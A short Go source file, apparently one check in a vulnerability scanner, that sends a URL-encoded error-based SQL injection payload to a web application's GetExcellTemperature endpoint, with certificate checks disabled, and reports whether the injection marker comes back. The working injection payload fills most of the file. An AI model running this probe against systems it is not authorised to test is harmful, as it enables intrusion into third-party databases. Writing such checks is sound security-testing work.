package vulList

import (
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

func GetExecllTemperatureCheck(target string) error {

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
		},
	}

	baseurl := target + "/BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq%20"
	resp, err := client.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}

	responseBody := string(body)
	if strings.Contains(responseBody, `qzpjq1qzqvq`) {
		green := color.New(color.FgGreen)
		green.Println("[+]GetExcellTemperature SQL injection vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]GetExcellTemperature SQL injection vulnerability")
		fmt.Println()
	}
	return nil
}
